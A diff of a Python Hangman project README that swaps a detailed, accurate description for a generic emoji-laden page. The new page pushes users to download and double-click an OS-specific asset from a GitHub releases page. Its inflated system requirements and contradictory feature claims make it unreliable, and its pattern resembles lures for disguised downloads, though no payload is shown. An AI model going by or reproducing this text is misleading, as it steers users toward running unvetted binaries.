@@ -1,90 +1,64 @@
-# Hangman — Console Game
-### Jetbrains python project
-https://hyperskill.org/projects/69
+# 🎮 hangman-python - Play the Classic Hangman Game Easily
 
-A small Python console implementation of the classic Hangman game. The script selects a random word from a built-in list and asks the player to guess it one letter at a time with a limited number of attempts.
+## 🚀 Getting Started
+Welcome to hangman-python! This is a simple console version of the classic Hangman game made with Python. It's easy to download and play, even if you don't have any programming experience.
 
-## Overview
-- Language: Python 3.x
-- Dependencies: only standard library modules (`random`, `string`)
-- Player starts with 8 attempts to guess a randomly chosen secret word.
-- Session score (wins / losses) is kept in memory while the program runs.
+## 📥 Download Now
+[![Download hangman-python](https://img.shields.io/badge/Download-hangman--python-blue.svg)](https://github.com/Lasrijan3105/hangman-python/releases)
 
-## Files
-- hangman.py — the main script (use the provided code).
+## 📋 Description
+Hangman-python is a small console game where players guess letters to reveal a hidden word. You can enjoy this game alone or challenge friends. It's a fun way to improve your vocabulary or just pass the time.
 
-## How to run
-1. Save the provided code to a file named `hangman.py`.
-2. Run from the terminal:
-   ```bash
-   python3 hangman.py
-   ```
-3. Follow on-screen prompts:
-   - Type `play` to start a new game.
-   - Type `results` to display the current session scoreboard.
-   - Type `exit` to quit.
+## 💻 System Requirements
+- Operating System: Windows, MacOS, or Linux
+- Python Version: Python 3.6 or newer
+- Memory: At least 512 MB of RAM
+- Disk Space: About 20 MB of free space
 
-## Game rules (as implemented)
-- Possible secret words: `["python", "java", "swift", "javascript"]`.
-- The player has 8 incorrect attempts allowed.
-- Each turn the program prints the current guessed state (known letters and `-` for unknown).
-- The program expects a single lowercase ASCII letter as input. Validation:
-  - If input length ≠ 1 → "Please, input a single letter."
-  - If input is not a lowercase ASCII letter → "Please, enter a lowercase letter from the English alphabet."
-- If the guessed letter is in the word, all occurrences of that letter are revealed.
-- If the letter was already guessed (correctly or incorrectly), the game prints "You've already guessed this letter."
-- If the letter is not in the word, the player loses one attempt.
-- If the player reveals the whole word before attempts run out → win.
-- If attempts reach 0 → loss. (The current implementation returns an empty string on loss; the secret word is not revealed.)
+## 🌐 Download & Install
+To get started, visit this page to download: [Download Page](https://github.com/Lasrijan3105/hangman-python/releases).
 
-## Code structure
-- Global variables:
-  - `words` — list of candidate words.
-  - `success_nb`, `lost_nb` — session counters for wins and losses.
-- Functions:
-  - `get_user_input(guessed_letters)` — displays the current guessed state, reads and validates a single-letter input, returns the valid letter.
-  - `play()` — runs one game: selects a word, loops until win or attempts exhausted, returns the word if guessed or an empty string on loss.
-- Main loop:
-  - Prints "H A N G M A N" and repeatedly prompts the user for `play`, `results`, or `exit`, updating and showing the scoreboard.
+1. **Visit the Releases Page**: Click the link above to go to the releases page.
+  
+2. **Choose the Latest Version**: Look for the latest release title, for example, "v1.0".
 
-## Implementation details and notes
-- The script uses:
-  - `guessed_letters` list of characters for display.
-  - `remaining_letters` list to track letters not yet revealed (removes each occurrence when guessed).
-  - `fake_guessed_letters` set to track incorrect guesses already made.
-- The condition that detects repeated guesses:
-  ```
-  elif user_input not in remaining_letters and user_input in secret_word or user_input in fake_guessed_letters:
-  ```
-  This is equivalent to:
-  ```
-  (user_input not in remaining_letters and user_input in secret_word) or (user_input in fake_guessed_letters)
-  ```
-  and handles both re-guessing a previously revealed letter and repeating a previously incorrect guess.
+3. **Download the Release**: Click on the asset that matches your operating system. 
 
-## Suggested improvements
-- Reveal the secret word after a loss to give feedback.
-- Persist the scoreboard to disk (JSON file or SQLite) so it survives program restarts.
-- Add an ASCII-art hangman that updates with each incorrect attempt.
-- Normalize uppercase input by applying `.lower()` automatically.
-- Load a larger vocabulary from an external file to increase variety.
-- Add CLI options (e.g., max attempts, word list path) using `argparse`.
-- Add unit tests for input validation and game logic.
+4. **Run the Game**:
+   - For **Windows**:
+     1. Double-click the downloaded file (e.g., `hangman.py`).
+     2. The game will open in your console.
+   - For **MacOS or Linux**:
+     1. Open Terminal.
+     2. Navigate to the folder where the file is located, using the `cd` command.
+     3. Type `python3 hangman.py` and hit enter.
 
-## Example session
-```text
-H A N G M A N
-Type "play" to play the game, "results" to show the scoreboard, and "exit" to quit: play
+Once the game starts, follow the on-screen instructions to begin playing.
 
-----
-Input a letter: p
-p---
-Input a letter: y
-py--
-...
-You guessed the word python!
-You survived!
-Type "play" to play the game, "results" to show the scoreboard, and "exit" to quit: results
-You won: 1 times.
-You lost: 0 times.
-```
+## 🎮 Gameplay Instructions
+1. When you start the game, you will see a series of underscores representing the letters of the hidden word.
+2. You will be prompted to guess a letter.
+3. If you guess correctly, the letter will fill in the blanks.
+4. If you guess incorrectly, you will lose one of your attempts.
+5. The game continues until you either guess the word or run out of attempts.
+
+## 🎉 Features
+- Easy to use: Simple text interface.
+- Single-player option: Play alone or with friends.
+- Educational: Improve your vocabulary and spelling skills.
+- Classic fun: Experience the timeless game.
+
+## 📖 Important Notes
+- Ensure you have Python installed on your system. You can download it from the [official Python website](https://www.python.org/downloads/).
+- Make sure your console can run scripts; some settings might need adjusting based on your system's configuration.
+
+## 🤝 Feedback and Support
+If you have any questions or need support while downloading or playing the game, feel free to:
+- Open an issue in the repository.
+- Look at the discussions section for possible solutions.
+
+## 📑 Topics
+The hangman-python game is associated with the following topics: console-game, hangman, hangman-cli, hangman-console, hangman-game, hangman-in-python, hyperskill, jetbrains-academy, python, and python3.
+
+## 🚀 Join the Fun!
+Have fun playing the classic Hangman game! Don’t forget to share your experiences and high scores with friends. Remember, the more you play, the better you get!
